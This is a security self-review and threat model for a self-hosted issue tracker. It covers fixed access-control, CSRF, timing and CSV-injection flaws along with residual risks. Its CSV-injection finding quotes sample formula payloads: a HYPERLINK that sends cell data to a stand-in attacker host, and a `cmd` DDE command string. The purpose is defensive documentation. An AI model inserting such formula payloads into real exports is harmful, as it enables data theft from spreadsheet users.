# Threat model and security self-review (V1)

This is the Phase 8 (Milestone 4) deliverable required by `docs/REDUCED_SCOPE_ROADMAP.md`: "Threat-model /
security self-review of what V1 actually built (not the original full-scope plan)." It is a review of the
actual implementation in this repository as of 2026-08-02, not of `REDUCED_SCOPE_SPECIFICATION.md`'s
aspirational text. See `docs/VERIFICATION.md`'s "Security self-review and fixes (D-none, Phase 8 slice 4)"
entry for exactly how each finding below was verified.

## Scope and assumptions

- **Deployment model**: single-tenant, self-hosted (D-non-negotiable). The operator who runs `docker
  compose up` (or builds/runs the binary directly) is trusted; this review does not model a hostile
  hosting provider or a compromised host OS.
- **Trust boundary**: the HTTP API (`/api/v1/...`) is the only network-facing surface. The CLI
  (`ticket-hub-cli`) is a local, operator-only tool with no network listener; its inputs (backup/restore
  paths, `--admin` flag, seed data) are trusted operator input, not attacker input.
- **Actors**:
  - **Anonymous** -- no session/PAT. Can reach `GET /api/health` always, and read-only issue/project
    routes only if the installation-wide anonymous-read toggle (D59) is enabled (off by default).
  - **Authenticated, no project role** -- any user with a valid session or PAT. Per D58, every project is
    readable by every authenticated user (there is no private-project concept in V1); watching/voting/
    reacting are explicitly self-service with no role requirement (D20/D79/D84).
  - **Project Member / Admin** -- the fixed per-project role (D3), gating issue/comment/worklog/attachment
    writes at Member, and project/comment/attachment administration at Admin.
  - **Global administrator** -- bypasses every project-role check; the only actor who can create users,
    manage the recycle bins, configure the anonymous-read toggle, and view the audit log.
- **Scope note**: this historical V1 review predates the explicitly-approved
  post-V1 custom fields, webhooks, outbound email and idempotency work. The
  original findings remain valid for V1; current integration behavior and
  residual risks are documented in `docs/SCOPE.md`, `docs/DEPLOYMENT.md`, and
  the post-V1 section of `docs/REMOVED_AND_DEFERRED_FEATURES.md`. OIDC,
  self-registration and per-field permission schemes remain out of scope.

## Method

A dedicated review pass (2026-08-02) read every HTTP route in `src/web/Api.cpp`, every authorization check
in `src/application/TicketService.cpp`/`AuthService.cpp`, the query construction in both database adapters,
the attachment storage layer, and the client-side escaping/CSRF handling in `web/app.js`, specifically
looking for: broken access control (including IDOR), CSRF gaps, SQL injection, XSS, path traversal,
credential/secret handling, and rate-limiting bypasses. This was a static/code-reading review plus targeted
live HTTP reproduction of each finding (not a formal WCAG-style external audit, and not a fuzzing/dependency-
CVE pass -- see "Not covered" below).

## 2026-08-26 external audit — superseding update

A second, external review of the network-facing surface reported 16 findings. All are now fixed; see
`CHANGELOG.md` and `docs/VERIFICATION.md` (both dated 2026-08-26). Three corrections to the 2026-08-02
review below, which that review got wrong rather than merely not covering:

- **"the download route's `Content-Disposition: inline` vs `attachment` split still correctly denies
  HTML/XML/SVG MIME types inline rendering"** was false. The split existed and the intent was right, but
  the comparison was case-sensitive against lowercase literals while MIME types are case-insensitive, so
  `TEXT/HTML` was served `inline` and executed script in this application's origin. The deny-list is now
  a case-insensitive allow-list in `web/AttachmentContentType.{h,cpp}` and the download response carries
  its own CSP.
- **"Admin account creation: there is no HTTP route for it at all"** is stale. `POST /api/v1/admin/users`
  exists (D2/D53/D57) and is correctly global-admin-gated, but the sentence no longer describes the code.
- **Rate limiting** was listed under "accepted residual risk" as merely *weakening* brute-force protection
  behind a reverse proxy. It was worse than that: because the limiter also consumed budget on successful
  sign-ins, 20 requests from any unauthenticated caller locked the entire installation out of signing in
  for 15 minutes, repeatable indefinitely. Fixed (failures only, keyed on account + IP).

Two further items the 2026-08-02 review did not consider at all, both now fixed: `TICKETHUB_SEED_DEMO`
defaulted to `true`, so every start path except `docker-compose.yml` created a global administrator whose
password is published in this repository; and `failed_login_count` was cleared only on a successful login,
so an expired lockout re-latched on the next wrong password, permanently locking out any account whose
email address an attacker knew -- with no self-service password reset to recover through.

Finally, the review below did not notice that the attachment download route sent
`X-Frame-Options: DENY`, which blocks same-origin framing as well, so the D99 PDF and text preview
iframes could never have loaded. That is fixed as a side effect of the CSP work.

## Findings fixed in the 2026-08-02 batch

### 1. Broken access control (IDOR) on comment, worklog, and attachment mutation routes -- **fixed**

Every comment/worklog/attachment write route is nested under an issue's URL
(`/api/v1/issues/{issueKey}/comments/{id}`, `.../worklogs/{id}`, `.../attachments/{id}`). Before this fix,
`TicketService::editComment`/`deleteComment`/`editWorklog`/`deleteWorklog`/`deleteAttachment` resolved the
project-role check against the issue named in the URL, then looked up the target comment/worklog/
attachment **purely by its own id** -- with no check that the resource actually belonged to that issue.

Because every project is readable by every authenticated user (D58), any authenticated user could discover
a real comment/worklog/attachment id belonging to a project they have no elevated role on, then reach it
through the URL of a *different* issue where they do hold a sufficient role, and the role check would pass
for the wrong project. Concretely: a project Member of Project A (with zero access to Project B) could
edit or delete any worklog anywhere in the installation, and a project Admin of Project A could edit/
delete any comment or attachment anywhere in the installation, as long as they routed the request through
one of their own issues' URLs and supplied the target resource's real id.

**Fix**: `TicketService.cpp` now checks that the looked-up resource's `issueId` matches the URL-resolved
issue's `id` before proceeding, treating a mismatch identically to "resource not found" (returns
`nullopt`/`false`, matching the existing unknown-id convention, not a `Forbidden` throw -- this avoids
leaking to the caller *why* the id didn't work). Reproduced live over HTTP before the fix (an authenticated
non-admin editing another project's comment via a URL substitution returned `200`) and confirmed fixed
(now `404 Comment not found`); new regression tests in `tests/authorization_integration_tests.cpp` cover
all three resource types cross-project, plus confirming the ordinary role check still applies correctly
when the resource *is* addressed through its own issue's URL.

Comment/attachment/worklog reactions and watch/vote were checked too and are **not** affected -- those are
intentionally self-service with no role gate at all (D20/D79/D84), so there is no privilege for a URL/id
mismatch to escalate past.

### 2. CSRF cookie was a literal prefix of the session token -- **fixed**

The double-submit CSRF cookie (`th_csrf`, deliberately non-`HttpOnly` so client JS can echo it back in the
`X-CSRF-Token` header) was set to `sessionToken.substr(0, 32)` -- literally the first 16 bytes of the
32-byte `HttpOnly` session bearer token, hex-encoded. `csrfTokenValid` only ever compares the cookie
against the header verbatim, so the CSRF token never needed any relationship to the session token at all;
reusing a session-token prefix was an unnecessary shortcut that meant any future cookie-read primitive
(an XSS bug the CSP doesn't catch, a misconfigured subdomain, an over-broad log capturing `Set-Cookie`)
would leak 128 bits of the actual `HttpOnly` session secret through the intentionally-JS-readable cookie,
undermining part of the point of marking the session cookie `HttpOnly` in the first place.

**Fix**: the CSRF cookie is now generated independently via `Common::randomTokenHex(16)` at login, with no
mathematical relationship to the session token. Verified live: the two cookie values returned by
`/api/v1/auth/login` no longer share a prefix, and CSRF-protected writes still succeed with the new
independent token.

### 3. Login response-time side-channel enabled user-email enumeration -- **fixed**

`AuthService::login` threw immediately for an unknown/inactive email without ever calling the (Argon2id,
deliberately slow, ~tens of milliseconds) `Common::verifyPassword`, but always ran that check for a known
email with a wrong password. Even though both paths return the identical `"Invalid email or password"`
message, the response-time gap between them lets a remote, unauthenticated caller distinguish "no such
account" from "account exists" and enumerate valid email addresses -- useful reconnaissance ahead of a
credential-stuffing or targeted-phishing campaign against a self-hosted installation.

**Fix**: added `dummyPasswordHashForTimingEqualization()` -- a fixed dummy password hashed once, lazily, at
first use -- and the not-found/inactive branch now runs one Argon2id verification against it (discarding
the result) before throwing, so both branches pay comparable cost. This does not make timing perfectly
indistinguishable (database lookup cost still differs slightly), but it closes the dominant, easily
measurable gap. Verified live: both the wrong-password and unknown-email cases still return `401` with the
same message; correct login is unaffected.

### 4. `/api/v1/auth/logout` was the only mutating route with no CSRF check -- **fixed**

All 46 state-changing routes were audited; 45 checked `csrfTokenValid(request)` before acting, logout did
not. In practice this was not presently exploitable -- `th_session` is `SameSite=Strict`, which already
blocks the cookie from being attached to any cross-site request including a forged top-level form
navigation -- but it was a latent inconsistency that would become a forced-logout CSRF if `SameSite` were
ever relaxed for some future compatibility reason. **Fix**: logout now checks `csrfTokenValid(request)` like
every other mutating route, for defense in depth and consistency. Verified live: logout without the
`X-CSRF-Token` header now returns `403`; with the correct header it still succeeds.

### 5. CSV export was vulnerable to formula/CSV injection -- **fixed**

`GET /api/v1/issues/export.csv`'s `csvField` escaped commas/quotes/newlines per RFC 4180 but did not
neutralize a field beginning with `=`, `+`, `-`, or `@` -- the characters spreadsheet applications
(Excel, Google Sheets, LibreOffice Calc) treat as "this cell is a formula" regardless of the exporting
application's intent. Any project Member can set an issue's summary/description/labels to a formula
payload (e.g. `=HYPERLINK("http://attacker/?"&A1)`), and it would execute when a user later opens the
exported CSV in a spreadsheet application, subject to that application's own protections. **Fix**: `csvField`
now prefixes a field with a leading apostrophe when it starts with one of those four characters -- the
standard OWASP CSV Injection mitigation, which every major spreadsheet application interprets as "force
plain text" without displaying the apostrophe itself. Verified live: an issue summary of
`=cmd|'/c calc'!A1` now exports as `'=cmd|'/c calc'!A1`.

## Already mitigated (reviewed, no change needed)

- **Password hashing**: Argon2id at `m=19456 KiB, t=2, p=1` (meets OWASP's current minimum) --
  `src/common/PasswordHash.cpp`.
- **Session/PAT secrets**: 256-bit random tokens, SHA-256-hashed at rest, the raw value returned to the
  client only once at creation -- `AuthService.cpp`; confirmed the stored column is `token_hash`, not the
  token itself, in `docs/SCHEMA.md`.
- **Cookies**: `th_session` is `HttpOnly; Secure; SameSite=Strict`; the double-submit CSRF pattern is
  implemented correctly on both server (`Api.cpp`) and client (`web/app.js`).
- **Login lockout**: two independent layers -- a 10-failed-attempt/15-minute per-account lock (existing
  from Phase 1) plus the Phase 6 20-attempt/15-minute per-IP rate limiter (D124).
- **SQL injection**: every query sampled across both database adapters is parameterized (`$n` for
  PostgreSQL, `?n` for SQLite); the only string-concatenated SQL fragments are fixed internal literals
  (table/column names), never request-derived data. Search filters bind user input as a parameter, not by
  concatenating it into the query text.
- **XSS**: `escapeHtml` is applied consistently at every `innerHTML` interpolation site in `web/app.js`;
  the Markdown renderer (D16) escapes first and only ever wraps already-escaped text in a fixed safe-tag
  set, restricting link/image targets to `http(s)`/`mailto`/the app's own `attachment://<uuid>` scheme.
  The stored-XSS vulnerability found and fixed earlier in Phase 6 (spoofed attachment `Content-Type` +
  unsandboxed preview iframe) remains fixed: preview iframes use `sandbox=""` and the download route's
  `Content-Disposition: inline` vs `attachment` split still correctly denies HTML/XML/SVG/script MIME
  types inline rendering.
- **Path traversal**: attachment storage keys are always server-generated UUIDs; the client-supplied file
  name is only ever used as response metadata (CRLF-sanitized before going into a header), never as a
  filesystem path component.
- **Backup/restore shell commands**: `pg_dump`/`psql` invocation arguments (connection string, output
  path) are POSIX-single-quote-escaped and are always operator-supplied (CLI-only, no network path), not
  attacker-influenced.
- **Anonymous-read toggle (D59)**: every write route explicitly requires an authenticated `Principal`
  before proceeding; `requireReadAccess` is only ever used to gate reads, never writes.
- **Admin account creation**: there is no HTTP route for it at all -- `ticket-hub-cli create-user` is the
  entire mechanism, so there is no network-facing account-creation endpoint to abuse.
- **Secrets in logs**: no log call anywhere prints a password, session token, or PAT; the CLI redacts the
  database URL in its own diagnostic output; `JsonLogHandler` only reformats Crow's own log lines and has
  no request/response-body logging middleware.

## Accepted residual risk (documented, not fixed -- consistent with V1's fixed-scope decisions)

These are deliberate V1 tradeoffs already implied by the decision register, restated here so they are
visible in one place rather than scattered across individual batch verification notes:

- **Personal access tokens are unscoped** (D39/D40: "a token carries exactly its owner's permissions -- no
  scopes"). A leaked PAT is equivalent to full account compromise, including global-admin if the owner is
  an admin. There is no narrower-privilege token to mint instead. Operators should treat a PAT with the
  same care as a password and revoke it immediately if it may have leaked (`DELETE /api/v1/tokens/{id}`).
- **Rate limiting is per-process, in-memory, and IP-keyed with no reverse-proxy awareness** (D124/D125:
  "simple fixed rate limit... no admin config"). Crow does not trust `X-Forwarded-For`, so the limiter
  cannot be spoofed by a malicious client header, but a real deployment behind a TLS-terminating reverse
  proxy will see every client share the proxy's IP, collapsing the per-IP login/write buckets into one
  shared bucket for the whole install. This weakens (but does not eliminate -- the per-account lockout is
  IP-independent) brute-force protection in that specific topology. No admin-configurable exception exists
  by design; an operator who needs per-real-client rate limiting should enforce it at the reverse proxy.
- **No socket-level request-body cap** (`src/web/Api.cpp`'s own comment on `MaxJsonRequestBodyBytes`): the
  1 MiB JSON cap and 25 MB attachment cap (D98) are both enforced only after Crow has already buffered the
  full body, since Crow's `SimpleApp` has no pre-buffer size hook. An authenticated project Member could
  send large request bodies repeatedly for a memory-exhaustion denial of service. A production deployment
  should enforce a body-size limit at a reverse proxy in front of the application, as the code comment
  already states.

## Not covered by this review

- No fuzzing pass and no dependency/CVE audit of Crow, libpq, sqlite3, or libargon2's pinned versions.
- No live penetration test against a running deployment (findings were reproduced against a local
  instance, not an internet-facing one).
- No review of the migration SQL files' own column-level constraints (`NOT NULL`/`CHECK`/foreign keys) as
  a defense-in-depth layer independent of the application checks above.
- No formal automated security-scanner (e.g. Semgrep/CodeQL) run across the codebase -- this was a manual,
  targeted read of the attack surface described in "Method" above, not an exhaustive static-analysis pass.

## Threats this design cannot fully prevent by construction (documented, not gaps)

- **A malicious global administrator** is fully trusted by design (D-non-negotiable: single-tenant,
  self-hosted, one administrative tier with no further separation). This is consistent with V1's scope and
  is not treated as a finding.
- **A malicious project Admin** can already do everything the role is meant to allow within their own
  project (archive/delete the project, manage its issues). This is intended, not a vulnerability.
